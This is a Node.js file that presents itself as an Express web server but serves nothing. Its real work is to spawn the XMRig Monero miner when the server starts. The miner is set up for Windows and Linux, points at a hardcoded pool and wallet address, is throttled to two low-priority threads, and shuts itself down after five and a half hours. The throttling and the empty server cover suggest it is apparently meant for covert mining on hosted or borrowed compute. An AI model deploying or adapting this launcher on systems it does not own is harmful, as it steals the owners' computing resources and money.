const express = require('express');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');

const app = express();
const PLATFORM = os.platform().toLowerCase();

const PROC_GOV_PATH = path.resolve(__dirname, 'procgov64.exe');
const LINUX_PATH = path.resolve(__dirname, 'xmrig');
const WINDOWS_XMRIG_PATH = path.resolve(__dirname, 'xmrig.exe');

const WINDOWS_ARGS = [
    '-cpu=2',
    WINDOWS_XMRIG_PATH,
    '--url', 'gulf.moneroocean.stream:10128',
    '--user', '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc',
    '--pass', 'x',
    '--cpu-priority', '0',
    '--threads', '2',
    '--donate-level', '1',
    '--av', '0',
    '--cpu-max-threads-hint', '2'
];

const LINUX_ARGS = [
    '--url', 'gulf.moneroocean.stream:10128',
    '--user', '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc',
    '--pass', 'x',
    '--cpu-priority', '0',
    '--threads', '2',
    '--donate-level', '1',
    '--av', '0',
    '--cpu-max-threads-hint', '2'
];

class XMRIGMiner {
    constructor() {
        this._worker = null;
        this._filePath = null;
        this._args = [];
        this._running = false;

        this._init();
    }

    _init() {
        if (PLATFORM === 'linux') {
            this._loadLinux();
        } else if (PLATFORM === 'win32') {
            this._loadWindows();
        } else {
            throw new Error('Unsupported platform');
        }
    }

    _loadLinux() {
        this._filePath = LINUX_PATH;
        this._args = LINUX_ARGS;
    }

    _loadWindows() {
        this._filePath = PROC_GOV_PATH;
        this._args = WINDOWS_ARGS;
    }

    start() {
        if (this._running) {
            console.info('XMRIG already running');
            return;
        }

        this._running = true;
        this._exec();
    }

    stop() {
        if (this._worker) {
            this._worker.kill();
            this._worker = null;
            this._running = false;
        }
    }

    _exec() {
        // Start the process using procgov64 on Windows or xmrig on Linux
        this._worker = spawn(this._filePath, this._args);

        // Handle process errors
        this._worker.on('error', (err) => {
            console.error('Failed to start XMRIG process:', err);
        });

        // Passthrough output
        this._worker.stdout.on('data', data => console.info(data.toString()));
        this._worker.stderr.on('data', data => console.error(data.toString()));
    }
}

// Create an instance of the miner
const miner = new XMRIGMiner();

// Start mining when the server starts
app.listen(3000, () => {
    console.log('Express server is running on port 3000');
    console.log('Starting XMRIG miner...');
    miner.start();

    // Stop mining after 5 hours and 30 minutes (19800 seconds)
    setTimeout(() => {
        console.log('Stopping XMRIG miner after 5 hours 30 minutes...');
        miner.stop();
        process.exit();
    }, 19800 * 1000); // 19800 seconds in milliseconds
});

// Stop mining when the server is stopped (Ctrl+C)
process.on('SIGINT', () => {
    console.log('Stopping XMRIG miner...');
    miner.stop();
    process.exit();
});
